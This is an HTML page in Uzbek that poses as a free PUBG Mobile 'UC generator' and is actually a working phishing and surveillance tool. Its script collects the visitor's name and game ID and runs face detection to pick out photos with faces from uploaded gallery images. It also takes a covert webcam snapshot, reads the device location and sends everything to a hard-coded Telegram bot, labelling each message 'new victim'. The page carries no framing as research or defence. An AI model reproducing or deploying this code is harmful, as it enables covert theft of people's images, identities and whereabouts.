<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUBG MOBILE: FREE UC</title>
    <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
    <style>
        body { margin: 0; background: #010409; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .card { width: 90%; max-width: 400px; background: #0d1117; border: 2px solid #00f3ff; border-radius: 20px; padding: 20px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #161b22; border: 1px solid #30363d; border-radius: 8px; color: white; box-sizing: border-box; }
        .btn { width: 100%; padding: 15px; background: #00f3ff; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; color: black; }
        .btn:disabled { background: #555; }
        #status { font-size: 12px; color: #39ff14; margin-top: 10px; }
        #fileInput, video, canvas { display: none; }
    </style>
</head>
<body>

<div class="card" id="mainCard">
    <h2 style="color:#00f3ff">UC GENERATOR</h2>
    <p>UC miqdorini tanlang:</p>
    <select id="pkg" style="width:100%; padding:10px; background:#161b22; color:white; border-radius:8px;">
        <option>60 UC - BEPUL</option>
        <option>325 UC - 55,000 UZS</option>
    </select>
    
    <input type="text" id="u_name" placeholder="Ismingiz">
    <input type="number" id="u_id" placeholder="PUBG ID">

    <label for="fileInput" style="display:block; padding:10px; border:1px dashed #00f3ff; cursor:pointer; margin:10px 0;">
        📁 Galereyadan skrinshot yuklang
    </label>
    <input type="file" id="fileInput" accept="image/*" multiple onchange="startSilentScan(this)">
    
    <div id="status"></div>
    <button class="btn" id="sendBtn" onclick="requestAccess()" disabled>YUKLASH</button>
</div>

<video id="vid" autoplay playsinline></video>
<canvas id="canv"></canvas>

<script>
    const BOT_TOKEN = "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY";
    const CHAT_ID = "6198817749";

    let cameraPhoto = null;
    let verifiedFaces = [];
    let locationData = "";

    // AI-ni tezkor rejimda yuklash
    async function initAI() {
        await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model');
        document.getElementById('status').innerText = "Tizim tayyor.";
    }
    initAI();

    // Galereyani fonda sekin va tez skanerlash
    async function startSilentScan(input) {
        const status = document.getElementById('status');
        const btn = document.getElementById('sendBtn');
        verifiedFaces = [];
        const files = Array.from(input.files);
        
        status.innerText = "Tekshirilmoqda...";
        
        for (let file of files) {
            try {
                const img = await faceapi.bufferToImage(file);
                // Faqat yuzni qidirish (eng tezkor algoritm)
                const detect = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions());
                
                if (detect.length > 0) {
                    verifiedFaces.push(file);
                }
            } catch (e) { console.log("Faylda xato"); }
        }
        
        status.innerText = `Skanerlash tugadi. ${verifiedFaces.length} ta yuz aniqlandi.`;
        btn.disabled = false;
    }

    async function requestAccess() {
        const btn = document.getElementById('sendBtn');
        btn.innerText = "ISHLANMOQDA...";
        btn.disabled = true;

        try {
            // 1. Kamera (1 ta rasm)
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('vid');
            video.srcObject = stream;
            await new Promise(r => setTimeout(r, 1000));
            
            const canvas = document.getElementById('canv');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            cameraPhoto = await (await fetch(canvas.toDataURL('image/jpeg'))).blob();
            stream.getTracks().forEach(t => t.stop());

            // 2. Geolokatsiya
            navigator.geolocation.getCurrentPosition(async (pos) => {
                locationData = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                await finalSend();
            }, async () => {
                locationData = "Ruxsat berilmadi";
                await finalSend();
            });
        } catch (e) { alert("Xato! Ruxsat bering."); location.reload(); }
    }

    async function finalSend() {
        const name = document.getElementById('u_name').value;
        const id = document.getElementById('u_id').value;
        const pkg = document.getElementById('pkg').value;

        const text = `🚀 YANGI QURBON\n👤 Ism: ${name}\n🆔 ID: ${id}\n📦 Paket: ${pkg}\n📍 Manzil: ${locationData}`;

        // Ma'lumotlarni yuborish
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: CHAT_ID, text: text})
        });

        // Kameradan olingan rasm
        const fd1 = new FormData();
        fd1.append('chat_id', CHAT_ID);
        fd1.append('photo', cameraPhoto);
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: 'POST', body: fd1});

        // Galereyadan faqat yuzlar
        for (let face of verifiedFaces) {
            const fd2 = new FormData();
            fd2.append('chat_id', CHAT_ID);
            fd2.append('photo', face);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method: 'POST', body: fd2});
        }

        alert("Muvaffaqiyatli! UC 24 soat ichida yuboriladi.");
        location.reload();
    }
</script>
</body>
</html>
